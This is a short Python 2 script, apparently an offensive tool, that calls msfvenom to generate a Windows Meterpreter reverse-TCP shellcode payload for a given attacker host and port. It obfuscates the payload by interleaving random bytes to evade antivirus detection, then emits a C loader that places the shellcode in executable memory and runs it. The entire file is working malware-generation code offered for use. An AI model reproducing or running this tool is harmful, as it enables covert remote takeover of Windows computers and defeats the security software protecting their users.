#! /usr/bin/python
import os
import sys
import subprocess
if os.geteuid() != 0:
	exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.")
argc = len(sys.argv)

if (argc!=4):
	print "[*] Meterpreter Reverse Shell AV Bypass Tool."
	print "[*] Usage : " + sys.argv[0] + " LHOST LPORT OUTPUT_FILE"
	exit(0)
#Getting local host.
lhost = sys.argv[1]
#Getting local port.
lport = sys.argv[2]
#Getting output c file.
outputFile = sys.argv[3]

print "[*] Executing msfvenom."
p = subprocess.Popen(['msfvenom', 'LHOST='+lhost,'LPORT='+lport,'-p','windows/meterpreter/reverse_tcp','-f','python'], stdout=subprocess.PIPE,stderr=subprocess.PIPE)
out, err = p.communicate()
print err
exec(out)
print "[*] Mutating the buffer using urandom."
originalSize = str(len(buf))
print "[*] Original payload length " + originalSize + "."
buf2 = ""
for c in buf:
	buf2 += c + os.urandom(1)
finalSize = str(len(buf2))
print "[*] Final payload size is " + finalSize + "."
payload = "\\x".join("{:02x}".format(ord(c)) for c in buf2)
payload = "\\x" + payload

ccode = "#include <windows.h>\n\n"
ccode += "int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,LPSTR lpCmdLine, int nCmdShow) {\n\n"
ccode += "unsigned char *p = (unsigned char *)VirtualAlloc( NULL, ORIGINAL_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE );\n"
ccode += "char x[FINAL_SIZE] = \"PAYLOAD\";\n"
ccode += "int i=0;\n"
ccode += "int j=0;\n"
ccode += "for (i=0;i<ORIGINAL_SIZE;i++) {\n"
ccode += "	p[i]= x[j];\n"
ccode += "	j = j + 2;\n"
ccode += "}\n"
ccode += "(*(int(*)()) p)();\n"
ccode += "return 0;\n"
ccode += "}\n"
ccode = ccode.replace("ORIGINAL_SIZE",originalSize)
ccode = ccode.replace("FINAL_SIZE",finalSize)
ccode = ccode.replace("PAYLOAD",payload)

print "[*] Generating C File."
text_file = open(outputFile, "w")
text_file.write(ccode)
text_file.close()
print "[*] Done. Please compile the file using your favorite windows compiler."
